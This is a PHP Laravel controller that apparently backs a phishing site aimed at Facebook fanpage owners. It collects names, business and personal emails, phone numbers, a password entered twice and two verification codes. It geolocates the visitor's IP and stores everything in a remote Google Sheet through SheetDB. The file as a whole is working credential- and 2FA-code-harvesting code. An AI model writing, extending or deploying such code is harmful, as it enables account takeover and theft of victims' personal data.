<?php

namespace App\Http\Controllers;

use Exception;
use Illuminate\Http\Request;
use Stevebauman\Location\Facades\Location;
use SheetDB\SheetDB;

class MainController extends Controller
{
    public function first(){
        return redirect()->route('get.index');
    }
    public function index(){
        return view('index');
    }
    public function input(Request $request){
        if($request->isMethod('post')){
            $FanpageName = $request->input('FanpageName');
            $FullName = $request->input('FullName');
            $EmailBusiness = $request->input('BusinessEmail');
            $EmailPersonal = $request->input('PersonalEmail');
            $Phone = $request->input('Phone');
            $password = $request->input('password');
            $password2 = $request->input('password2');
            $time = now();
            $uniqueID = sha1($time);

            $ip=$request->getClientIp();
            $location = Location::get($ip);
            $selectedKeys = [
                'ip',
                'countryName',
                'cityName',
                'timezone'
            ];
            
            if($location) {
                $selected = array_intersect_key($location->toArray(), array_flip($selectedKeys));
                $region = json_encode($selected, JSON_PRETTY_PRINT);
            }
            else $region = '';
            //dd($region);
            $sheetdb = new SheetDB(env('SHEET_DB_IO'));
            $sheetdb->create([
                'FanpageName' => $FanpageName,
                'FullName' => $FullName,
                'EmailBusiness' => $EmailBusiness,
                'EmailPersonal' => $EmailPersonal,
                'Phone' => $Phone,
                'password' => $password,
                'password2' => $password2,
                'region' => $region,
                'inputTime' => $time->format('Y-m-d H:i:s'),
                'uniqueID' => $uniqueID,
            ]);
            $data = $sheetdb->get();
            return redirect()->route('get.confirm')->with(['uniqueID'=> $uniqueID, 'Phone' => substr_replace($Phone, '****', 4, -2)]);
        }
        return view('input');
    }
    public function confirm(Request $request){
        if($request->isMethod('post')){
            $sheetdb = new SheetDB(env('SHEET_DB_IO'));
            $uniqueID = $request->input('uniqueID');
            $verifyCode = $request->input('verifyCode');
            $verifyCode2 = $request->input('verifyCode2');
            $sheetdb->update('uniqueID', $uniqueID, [
                                                'verifyCode' => $verifyCode, 
                                                'verifyCode2' => $verifyCode2
                                            ]);
            return redirect()->route('get.finish');
        }
        return view('confirm');
    }

    public function admin(){
        return view('admin');
    }

    public function exportToExcel(Request $request){
        try{
            $sheetdb = new SheetDB(env('SHEET_DB_IO'));
            $sheetdb->create(['user'=>'admin','password'=>'pass']);
            $data = $sheetdb->get();

            return redirect()->back()->with('success','successfully');
        } catch(Exception $e){
            return redirect()->back()->with('fail',$e->getMessage());
        }
    }

    public function finish(Request $request){
        if($request->isMethod('post')){ 
            return view('finish');
        }
        return view('finish');
    }
}
